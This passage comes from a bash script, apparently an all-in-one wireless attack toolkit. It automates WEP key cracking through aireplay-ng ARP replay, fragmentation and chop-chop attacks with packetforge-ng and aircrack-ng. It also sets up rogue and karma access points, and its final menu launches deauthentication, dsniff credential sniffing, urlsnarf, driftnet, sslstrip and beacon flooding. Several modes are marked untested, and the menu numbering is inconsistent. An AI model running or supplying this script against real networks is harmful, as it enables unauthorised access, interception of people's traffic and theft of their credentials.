xterm -hold -bg black -fg blue -T "Reinjecting random ARP packet" -geometry 90x20 -e \
aireplay-ng -2 -p 0841 -m 68 -n 86 -b "$BSSID" -c FF:FF:FF:FF:FF:FF -h "$CLIENTMAC" "$MIFACE" &>/dev/null &
sleep 5;
}
function fragclientless(){
echo "+===================================+"
echo "Starting fragmenation attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Fragmenation Attack" -geometry 90x20 -e \
aireplay-ng -5 -b "$BSSID" -h "$MAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function fragclient(){
echo "+===================================+";
echo "Starting fragmenation attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Fragmenation Attack" -geometry 90x20 -e \
aireplay-ng -5 -b "$BSSID" -h "$CLIENTMAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function chopchopclientless(){
echo "+===================================+";
echo "Starting chop chop attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Chop Chop Attack" -geometry 90x20 -e \
aireplay-ng -4 -b "$BSSID" -h "$MAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function chopchopclient(){
echo "+===================================+";
echo "Starting chop chop attack against "$ESSID"";
xterm -hold -bg black -fg blue -T "Chop Chop Attack" -geometry 90x20 -e \
aireplay-ng -4 -b "$BSSID" -h "$CLIENTMAC" "$MONIFACE" &>/dev/null &
sleep 5;
}
function injectcapturedarpcleintless(){
echo "+===================================+";
echo "Injecting the created ARP packet";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -2 -b "$BSSID" -h "$MAC" -r h4x0r-arp "$MONIFACE" &>/dev/null &
sleep 5;
}
function injectcapturedarpcleint(){
echo "+===================================+";
echo "Injecting the created ARP packet";
xterm -hold -bg black -fg blue -T "Injecting ARP packets" -geometry 90x20 -e \
aireplay-ng -2 -b "$BSSID" -h "$CLIENTMAC" -r h4x0r-arp "$MONIFACE" &>/dev/null &
sleep 5;
}
function xorfragclientless(){
packetforge-ng -0 -a "$BSSID" -h "$MAC" -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w h4x0r-arp
sleep 5;
}
function xorfragclient(){
packetforge-ng -0 -a "$BSSID" -h "$CLIENTMAC" -k 255.255.255.255 -l 255.255.255.255 -y fragment*.xor -w h4x0r-arp
sleep 5;
}
function xorchopchopclientless(){
packetforge-ng -0 -a "$BSSID" -h "$MAC" -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w h4x0r-arp
sleep 5;
}
function xorchopchopclient(){
packetforge-ng -0 -a "$BSSID" -h "$CLIENTMAC" -k 255.255.255.255 -l 255.255.255.255 -y replay*.xor -w h4x0r-arp
sleep 5;
}
function crackkey(){
echo "+===================================+";
read -p "Hit Enter when you have 10,000 IV's, could take up to 5 min.";
echo "+===================================+";
echo "Starting to H4X0R the WEP key..................";
xterm -hold -bg black -fg blue -T "Cracking" -e aircrack-ng -b "$BSSID" h4x0r*.cap &>/dev/null &
sleep 1;
echo "+===================================+";
echo "You should see the WEP key soon......";
echo "+===================================+";
exit 0
}
function wepattackmenu(){
clear;
echo "******************************************************************";
echo "**************Please select the type of attack below**************";
echo "THIS WILL DELETE ANY PREVIOUS h4x0r.cap* FILE RENAME IT TO KEEP IT";
echo "******************************************************************";
showMenu (){
 echo
 echo "1) ARP request replay attack (clientless)"
 echo "2) NOT TESTED Fragmentation (clientless)"
 echo "3) NOT TESTED Chop Chop (clientless)"
 echo "3) NOT TESTED ARP request replay attack (client)"
 echo "4) NOT TESTED Fragmentation (Client)"
 echo "5) NOT TESTED Chop Chop (client)"
}
while [ 1 ]
do
 showMenu
 read CHOICE
 case "$CHOICE" in
 "1")
  echo "ARP request replay attack (clientless)";
  capture;
  associate;
  injectarpclientless;
  crackkey;
  ;;
 "2")
  echo "Fragmentation (clientless)";
  capture;
  associate;
  fragclientless;
  xorfragclientless;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 "3")
  echo "Chop Chop (clientless)"
  capture;
  associate;
  chopchopclientless;
  xorchopchopclientless;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 "4")
  echo "ARP request replay attack (client)";
  capture;
  associate;
  injectarpclientless;
  injectarpclient;
  crackkey; 
  ;;
 "5")
  echo "Fragmentation (Client)";
  capture;
  fragclient;
  xorfragclient;
  injectcapturedarpcleint;
  crackkey;
  ;;
 "6")
  echo "Chop Chop (client)";
  capture;
  chopchopclient;
  xorchopchopclient;
  injectcapturedarpcleintless;
  crackkey;
  ;;
 esac
done
}
# +===================================+
# | ANYTHING ABOVE THIS IS UNTESTED   |
# +===================================+

# --------------------------- #
# SCRIPT ACTUALLY STARTS HERE #
# --------------------------- #
setupenv
banner
echo "  * 1/4 oz Vodka      Pour all ingredients into mixing"
echo "  * 1/4 oz Gin        tin with ice, strain into glass."
echo "  * 1/4 oz Amaretto"
echo "  * 1/4 oz Triple sec"
echo "  * 1/4 oz Peach schnapps"
echo "  * 1/4 oz Sour mix"
echo "  * 1 splash Cranberry juice"
echo " -----------------------------------------------------"
echo ""
sleep 5
echo "+-----------------------------------------------------+"
# debugenv
pinginternet
depends
apachesetup
# apachecheck
if [ "$INTERNET" = "TRUE" ] && [ "$DNS" = "TRUE" ]; then checkupdate; fi
if [ "$INTERNET" = "TRUE" ] && [ "$DNS" = "TRUE" ]; then internetmenu; fi
if [ "$internetmenu" = "1" ]; then installdeps; fi
if [ "$internetmenu" = "2" ]; then installdeps; fi
if [ "$internetmenu" = "3" ]; then forceupdate; fi
if [ "$internetmenu" = "4" ]; then runscript; fi
stopshit
# responder
poisonmenu
if [ "$LOADCONF" = "0" ]; then softapmenu; fi
if [ "$LOADCONF" = "0" ]; then dhcpmenu; fi
if [ "$LOADCONF" = "0" ]; then settings; fi
# debugsettings
if [ "$softap" = "1" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
if [ "$softap" = "2" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
if [ "$softap" = "3" ]; then TAPIFACE=at0; fi
if [ "$softap" = "4" ]; then TAPIFACE=at0; fi
monitormodestop
if [ "$mode" = "4" ]; then wepattackmenu; fi
# debugsettings
if [ "$softap" = "1" ]; then hostapdkarmaconfig; starthostapd; fi
if [ "$softap" = "2" ]; then hostapdnokarmaconfig; starthostapd; fi
if [ "$softap" = "3" ]; then monitormodestart; startkarmaairbase; fi
if [ "$softap" = "4" ]; then monitormodestart; startairbase; fi
sleep 2
brlan
# if [ "$mode" != "2" ]; then wireshark -i $TAPIFACE -k &; fi
if [ "$DHCPSERVER" = "1" ]; then dnsmasqconfig; fi
if [ "$DHCPSERVER" = "2" ]; then dhcpd3config; fi
if [ "$DHCPSERVER" = "3" ]; then udhcpdconfig; fi
if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
if [ "$mode" = "2" ]; then DHCPSERVER=4; fi
if [ "$mode" = "1" ]; then
echo "# Generated by accesspoint.sh" > /etc/resolv.conf
# echo "nameserver $TAPIP" >> /etc/resolv.conf
fi
if [ "$mode" = "2" ]; then
echo "# Generated by accesspoint.sh" > /etc/resolv.conf
echo "nameserver 8.8.8.8" >> /etc/resolv.conf
fi
if [ "$softap" = "1" ]; then taillogshostapd; fi
if [ "$softap" = "2" ]; then taillogshostapd; fi
if [ "$softap" = "3" ]; then taillogsairbase; fi
if [ "$softap" = "4" ]; then taillogsairbase; fi
fw_start
attackmenu
if [ "$attack" = "1" ]; then deauth; fi
if [ "$attack" = "2" ]; then wireshark -i $TAPIFACE -p -k -w $folder/$TAPIFACE.pcap; fi
if [ "$attack" = "3" ]; then dsniff -m -i $TAPIFACE -d -w $folder/dsniff.log; fi
if [ "$attack" = "4" ]; then urlsnarf -i $TAPIFACE; fi
if [ "$attack" = "5" ]; then driftnet -i $TAPIFACE; fi
if [ "$attack" = "6" ]; then sslstrip -a -k -f; fi
if [ "$attack" = "7" ]; then beaconflood; fi
if [ "$attack" = "8" ]; then exit 0; fi
if [ "$attack" = "9" ]; then
echo ""
echo "ATEMPTING TO END ATTACK..."
stopshit
brlandown
monitormodestop
cleanup
fi